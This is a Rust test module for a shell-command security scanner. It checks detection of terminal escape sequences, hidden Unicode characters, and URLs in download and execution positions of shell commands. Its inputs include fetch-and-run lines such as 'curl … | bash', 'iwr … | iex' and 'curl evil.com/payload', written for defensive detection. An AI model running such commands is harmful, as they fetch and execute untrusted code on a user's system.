
    #[test]
    fn test_tier1_exec_no_non_ascii() {
        // Non-ASCII should NOT trigger exec-time scan
        assert!(!tier1_scan("echo café", ScanContext::Exec));
    }

    #[test]
    fn test_byte_scan_ansi() {
        let input = b"hello \x1b[31mred\x1b[0m world";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);
    }

    #[test]
    fn test_byte_scan_control_chars() {
        let input = b"hello\rworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);
    }

    #[test]
    fn test_byte_scan_bidi() {
        let input = "hello\u{202E}dlrow".as_bytes();
        let result = scan_bytes(input);
        assert!(result.has_bidi_controls);
    }

    #[test]
    fn test_byte_scan_zero_width() {
        let input = "hel\u{200B}lo".as_bytes();
        let result = scan_bytes(input);
        assert!(result.has_zero_width);
    }

    #[test]
    fn test_byte_scan_clean() {
        let input = b"hello world\n";
        let result = scan_bytes(input);
        assert!(!result.has_ansi_escapes);
        assert!(!result.has_control_chars);
        assert!(!result.has_bidi_controls);
        assert!(!result.has_zero_width);
    }

    #[test]
    fn test_extract_urls_basic() {
        let urls = extract_urls("curl https://example.com/install.sh", ShellType::Posix);
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].raw, "https://example.com/install.sh");
    }

    #[test]
    fn test_extract_urls_from_leading_env_assignment() {
        let urls = extract_urls(
            "PAYLOAD_URL=https://example.com/install.sh curl ok",
            ShellType::Posix,
        );
        assert!(
            urls.iter()
                .any(|u| u.raw == "https://example.com/install.sh" && u.in_sink_context),
            "leading env assignment URL should be extracted in sink context"
        );
    }

    #[test]
    fn test_extract_urls_from_quoted_leading_env_assignment() {
        let urls = extract_urls(
            "PAYLOAD_URL='https://example.com/install.sh' curl ok",
            ShellType::Posix,
        );
        assert!(
            urls.iter()
                .any(|u| u.raw == "https://example.com/install.sh"),
            "quoted leading env assignment URL should be extracted"
        );
    }

    #[test]
    fn test_proxy_env_assignment_url_is_not_treated_as_destination() {
        let urls = extract_urls(
            "HTTP_PROXY=http://proxy:8080 curl https://example.com/data",
            ShellType::Posix,
        );
        assert!(
            !urls.iter().any(|u| u.raw == "http://proxy:8080"),
            "proxy configuration URLs should not be treated as destinations"
        );
    }

    #[test]
    fn test_extract_urls_pipe() {
        let urls = extract_urls(
            "curl https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        assert!(!urls.is_empty());
        assert!(urls[0].in_sink_context);
    }

    #[test]
    fn test_extract_urls_scp() {
        let urls = extract_urls("git clone git@github.com:user/repo.git", ShellType::Posix);
        assert!(!urls.is_empty());
        assert!(matches!(urls[0].parsed, UrlLike::Scp { .. }));
    }

    #[test]
    fn test_extract_docker_ref() {
        let urls = extract_urls("docker pull nginx", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(docker_urls.len(), 1);
    }

    #[test]
    fn test_extract_powershell_iwr() {
        let urls = extract_urls(
            "iwr https://example.com/script.ps1 | iex",
            ShellType::PowerShell,
        );
        assert!(!urls.is_empty());
    }

    #[test]
    fn test_wrapper_preserves_sink_context() {
        let urls = extract_urls(
            "env --ignore-environment curl http://example.com",
            ShellType::Posix,
        );
        assert!(
            urls.iter()
                .any(|u| u.raw == "http://example.com" && u.in_sink_context),
            "wrapped sink commands should keep sink context"
        );
    }

    #[test]
    fn test_env_wrapper_preserves_tirith_run_sink_context() {
        let urls = extract_urls("env tirith run http://example.com", ShellType::Posix);
        assert!(
            urls.iter()
                .any(|u| u.raw == "http://example.com" && u.in_sink_context),
            "env wrapper should preserve tirith run sink context"
        );
    }

    #[test]
    fn test_command_wrapper_preserves_tirith_run_sink_context() {
        let urls = extract_urls("command tirith run http://example.com", ShellType::Posix);
        assert!(
            urls.iter()
                .any(|u| u.raw == "http://example.com" && u.in_sink_context),
            "command wrapper should preserve tirith run sink context"
        );
    }

    #[test]
    fn test_time_wrapper_preserves_tirith_run_sink_context() {
        let urls = extract_urls("time tirith run http://example.com", ShellType::Posix);
        assert!(
            urls.iter()
                .any(|u| u.raw == "http://example.com" && u.in_sink_context),
            "time wrapper should preserve tirith run sink context"
        );
    }

    #[test]
    fn test_strip_quotes_single_char() {
        assert_eq!(strip_quotes("\""), "\"");
        assert_eq!(strip_quotes("'"), "'");
    }

    #[test]
    fn test_strip_quotes_empty() {
        assert_eq!(strip_quotes(""), "");
    }

    #[test]
    fn test_scan_bytes_bel_vt_del() {
        // BEL (0x07)
        let input = b"hello\x07world";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // VT (0x0B)
        let input = b"hello\x0Bworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // FF (0x0C)
        let input = b"hello\x0Cworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // DEL (0x7F)
        let input = b"hello\x7Fworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);
    }

    #[test]
    fn test_scan_bytes_osc_apc_dcs() {
        // OSC: \e]
        let input = b"hello\x1b]0;title\x07world";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);

        // APC: \e_
        let input = b"hello\x1b_dataworld";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);

        // DCS: \eP
        let input = b"hello\x1bPdataworld";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);
    }

    #[test]
    fn test_schemeless_long_tld() {
        assert!(looks_like_schemeless_host("example.academy"));
        assert!(looks_like_schemeless_host("example.photography"));
    }

    #[test]
    fn test_segment_index_correct() {
        let urls = extract_urls("curl https://a.com | wget https://b.com", ShellType::Posix);
        // Each URL should have the segment index of the segment it came from
        for url in &urls {
            // segment_index should be 0 or 1, not an incrementing counter
            assert!(url.segment_index <= 1);
        }
    }

    #[test]
    fn test_docker_build_context_not_image() {
        let urls = extract_urls("docker build .", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(
            docker_urls.len(),
            0,
            "build context '.' should not be treated as image"
        );
    }

    #[test]
    fn test_docker_image_subcmd() {
        let urls = extract_urls("docker image pull nginx", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(docker_urls.len(), 1);
    }

    #[test]
    fn test_docker_run_image_after_double_dash() {
        let urls = extract_urls(
            "docker run --rm -- evil.registry/ns/img:1",
            ShellType::Posix,
        );
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(docker_urls.len(), 1);
        assert_eq!(docker_urls[0].raw, "evil.registry/ns/img:1");
    }

    /// Module-boundary enforcement: guarantees no tier-1 extractor exists
    /// outside the declarative pattern table in `build.rs`.
    #[test]
    fn test_tier1_module_boundary_enforcement() {
        let ids = tier1_generated::EXTRACTOR_IDS;
        assert!(!ids.is_empty(), "EXTRACTOR_IDS must not be empty");
        let exec_count = tier1_generated::TIER1_EXEC_FRAGMENT_COUNT;
        let paste_count = tier1_generated::TIER1_PASTE_FRAGMENT_COUNT;
        assert!(exec_count > 0, "Must have exec fragments");
        assert!(
            paste_count >= exec_count,
            "Paste fragments must be superset of exec fragments"
        );
        Regex::new(tier1_generated::TIER1_EXEC_PATTERN)
            .expect("Generated exec pattern must be valid regex");
        Regex::new(tier1_generated::TIER1_PASTE_PATTERN)
            .expect("Generated paste pattern must be valid regex");
    }

    #[test]
    fn test_scan_bytes_trailing_cr_not_flagged() {
        let result = scan_bytes(b"/path\r");
        assert!(
            !result.has_control_chars,
            "trailing \\r should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_trailing_crlf_not_flagged() {
        let result = scan_bytes(b"/path\r\n");
        assert!(
            !result.has_control_chars,
            "trailing \\r\\n should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_windows_multiline_not_flagged() {
        let result = scan_bytes(b"line1\r\nline2\r\n");
        assert!(
            !result.has_control_chars,
            "Windows \\r\\n line endings should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_embedded_cr_still_flagged() {
        let result = scan_bytes(b"safe\rmalicious");
        assert!(
            result.has_control_chars,
            "embedded \\r before non-\\n should be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_mixed_crlf_and_attack_cr() {
        let result = scan_bytes(b"line1\r\nfake\roverwrite\r\n");
        assert!(
            result.has_control_chars,
            "attack \\r mixed with \\r\\n should be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_only_cr() {
        let result = scan_bytes(b"\r");
        assert!(
            !result.has_control_chars,
            "lone trailing \\r should not be flagged"
        );
    }

    #[test]
    fn test_schemeless_skip_curl_output_flag() {
        // `-o <filename>` is curl's output flag; the filename must not be
        // treated as a schemeless URL even though it matches the host shape.
        let urls = extract_urls("curl -o lenna.png https://example.com", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            schemeless.is_empty(),
            "lenna.png should not be detected as schemeless URL"
        );
    }

    #[test]
    fn test_schemeless_skip_curl_output_combined() {
        let urls = extract_urls("curl -olenna.png https://example.com", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            schemeless.is_empty(),
            "-olenna.png should not be detected as schemeless URL"
        );
    }

    #[test]
    fn test_schemeless_skip_wget_output_flag() {
        let urls = extract_urls("wget -O output.html https://example.com", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            schemeless.is_empty(),
            "output.html should not be detected as schemeless URL"
        );
    }

    #[test]
    fn test_schemeless_skip_wget_combined() {
        let urls = extract_urls("wget -Ooutput.html https://example.com", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            schemeless.is_empty(),
            "-Ooutput.html should not be detected as schemeless URL"
        );
    }

    #[test]
    fn test_schemeless_real_domain_still_detected() {
        let urls = extract_urls("curl evil.com/payload", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            !schemeless.is_empty(),
            "evil.com/payload should be detected as schemeless URL"
        );
    }

    #[test]
    fn test_schemeless_user_at_host_detected_in_sink_context() {
        let urls = extract_urls("curl user@bit.ly", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert_eq!(schemeless.len(), 1);
        assert_eq!(schemeless[0].raw, "user@bit.ly");
    }

    #[test]
    fn test_scp_user_at_host_not_treated_as_schemeless_url() {
        let urls = extract_urls("scp user@server.com file.txt", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(schemeless.is_empty());
    }

    fn scp_has_schemeless(cmd: &str, shell: ShellType) -> bool {
        extract_urls(cmd, shell)
            .iter()
            .any(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
    }

    #[test]
    fn test_scp_plain_host_path_not_schemeless() {
        // The reporter's exact command shape.
        assert!(!scp_has_schemeless(
            "scp test.asdf testhost:/home/user/",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_scp_plain_host_relative_path_not_schemeless() {
        assert!(!scp_has_schemeless(
            "scp file.txt host:dir/",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_rsync_plain_host_path_not_schemeless() {
        assert!(!scp_has_schemeless(
            "rsync -av src host:/dest/",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_scp_one_letter_alias_posix_accepted() {
        // `x:/tmp/` on POSIX is a legitimate single-letter SSH alias.
        // The drive-letter guard must NOT reject this.
        assert!(!scp_has_schemeless("scp file x:/tmp/", ShellType::Posix));
    }

    #[test]
    fn test_scp_windows_backslash_always_rejected() {
        // `C:\...` is never an scp remote — any shell.
        assert!(parse_scp_remote_spec("C:\\Users\\me\\file", ShellType::Posix).is_none());
        assert!(parse_scp_remote_spec("C:\\Users\\me\\file", ShellType::PowerShell).is_none());
        assert!(parse_scp_remote_spec("C:\\Users\\me\\file", ShellType::Cmd).is_none());
        assert!(parse_scp_remote_spec("D:\\backup", ShellType::Posix).is_none());
    }

    #[test]
    fn test_scp_windows_forward_slash_shell_scoped() {
        // `C:/Users/me/file` is a drive path on PowerShell/Cmd, but on POSIX
        // it collides with the legitimate one-letter alias form — accept there.
        assert!(parse_scp_remote_spec("C:/Users/me/file", ShellType::PowerShell).is_none());
        assert!(parse_scp_remote_spec("C:/Users/me/file", ShellType::Cmd).is_none());
        assert!(parse_scp_remote_spec("C:/Users/me/file", ShellType::Posix).is_some());
        assert!(parse_scp_remote_spec("C:/Users/me/file", ShellType::Fish).is_some());
    }

    #[test]
    fn test_scp_windows_ambiguous_drive_letter_accepted() {
        // `C:foo` is ambiguous with scp's `x:relative-path` alias form — accept
        // it in every shell to preserve back-compat; narrow guards beat blanket
        // bans here.
        for shell in [
            ShellType::Posix,
            ShellType::Fish,
            ShellType::PowerShell,
            ShellType::Cmd,
        ] {
            assert!(
                parse_scp_remote_spec("C:foo", shell).is_some(),
                "C:foo should parse as remote in shell {shell:?}"
            );
            assert!(
                parse_scp_remote_spec("D:backup/x.txt", shell).is_some(),
                "D:backup/x.txt should parse as remote in shell {shell:?}"
            );
        }
    }

    #[test]
    fn test_scp_rejects_url_scheme() {
        assert!(parse_scp_remote_spec("http://evil.com/a.sh", ShellType::Posix).is_none());
        assert!(parse_scp_remote_spec("https://a.b/c", ShellType::Posix).is_none());
    }

    #[test]
    fn test_scp_rejects_flag_and_absolute_local() {
        assert!(parse_scp_remote_spec("-P", ShellType::Posix).is_none());
        assert!(parse_scp_remote_spec("--port=22", ShellType::Posix).is_none());
        // `/tmp:weird` — `:` preceded by `/` means absolute local path.
        assert!(parse_scp_remote_spec("/tmp:weird", ShellType::Posix).is_none());
    }

    #[test]
    fn test_scp_accepts_user_at_host_forms() {
        // Back-compat with the original covered shape.
        assert!(parse_scp_remote_spec("user@server.com:file.txt", ShellType::Posix).is_some());
        assert!(parse_scp_remote_spec("user@host:/path", ShellType::Posix).is_some());
    }

    #[test]
    fn test_scp_rejects_missing_parts() {
        assert!(parse_scp_remote_spec("", ShellType::Posix).is_none());
        assert!(parse_scp_remote_spec(":path", ShellType::Posix).is_none()); // empty host
        assert!(parse_scp_remote_spec("@host:path", ShellType::Posix).is_none()); // empty user
        assert!(parse_scp_remote_spec("user@:path", ShellType::Posix).is_none());
        // empty host
    }

    #[test]
    fn test_scp_rejects_host_with_slash() {
        // Host must not contain `/`.
        assert!(parse_scp_remote_spec("foo/bar:baz", ShellType::Posix).is_none());
    }

    #[test]
    fn test_parse_scp_remote_spec_fields_populated() {
        // Exercise the parser's structured output so downstream consumers
        // of user/host/path can rely on the fields rather than just the
        // Option presence check.
        let spec = parse_scp_remote_spec("user@server.com:/path", ShellType::Posix).unwrap();
        assert_eq!(spec.user.as_deref(), Some("user"));
        assert_eq!(spec.host, "server.com");
        assert_eq!(spec.path, "/path");

        let spec = parse_scp_remote_spec("host:/dest/", ShellType::Posix).unwrap();
        assert_eq!(spec.user, None);
        assert_eq!(spec.host, "host");
        assert_eq!(spec.path, "/dest/");
    }

    #[test]
    fn test_schemeless_png_no_slash_is_file() {
        assert!(!looks_like_schemeless_host("lenna.png"));
    }

    #[test]
    fn test_schemeless_tld_overlap_with_path_is_domain() {
        // evil.zip/payload has a path component, so the .zip extension heuristic
        // should NOT suppress it — evil.zip is a real TLD and this is a domain.
        assert!(looks_like_schemeless_host("evil.zip/payload"));
        assert!(looks_like_schemeless_host("evil.sh/payload"));
    }

    #[test]
    fn test_schemeless_tld_overlap_without_path_is_file() {
        // Without a path, lenna.zip / script.sh look like filenames, not domains.
        assert!(!looks_like_schemeless_host("lenna.zip"));
        assert!(!looks_like_schemeless_host("script.sh"));
    }

    #[test]
    fn test_schemeless_tld_overlap_sink_context_detected() {
        // In a real sink context, evil.zip/payload should be detected as schemeless URL.
        let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
        let schemeless: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::SchemelessHostPath { .. }))
            .collect();
        assert!(
            !schemeless.is_empty(),
            "evil.zip/payload should be detected as schemeless URL in sink context"
        );
    }
}
